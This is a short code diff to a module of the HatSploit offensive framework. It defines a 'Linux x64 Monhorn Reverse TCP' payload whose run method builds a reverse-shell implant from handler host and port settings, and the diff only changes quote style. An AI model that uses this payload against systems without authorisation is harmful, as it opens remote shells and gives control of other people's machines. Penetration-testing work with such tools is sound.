@@ -11,21 +11,21 @@ from hatsploit.lib.payload import Payload
 
 class HatSploitPayload(Payload, Monhorn):
     details = {
-        'Name': "Linux x64 Monhorn Reverse TCP",
-        'Payload': "linux/x64/monhorn_reverse_tcp",
-        'Authors': ['Ivan Nikolsky (enty8080) - payload developer'],
-        'Description': "Monhorn reverse TCP payload for Linux x64.",
-        'Architecture': "x64",
-        'Platform': "linux",
-        'Session': MonhornSession,
-        'Rank': "high",
-        'Type': "reverse_tcp",
+        "Name": "Linux x64 Monhorn Reverse TCP",
+        "Payload": "linux/x64/monhorn_reverse_tcp",
+        "Authors": ["Ivan Nikolsky (enty8080) - payload developer"],
+        "Description": "Monhorn reverse TCP payload for Linux x64.",
+        "Architecture": "x64",
+        "Platform": "linux",
+        "Session": MonhornSession,
+        "Rank": "high",
+        "Type": "reverse_tcp",
     }
 
     def run(self):
         return self.get_monhorn(
-            self.details['Platform'],
-            self.details['Architecture'],
-            self.handler['RHOST'],
-            self.handler['RPORT'],
+            self.details["Platform"],
+            self.details["Architecture"],
+            self.handler["RHOST"],
+            self.handler["RPORT"],
         )
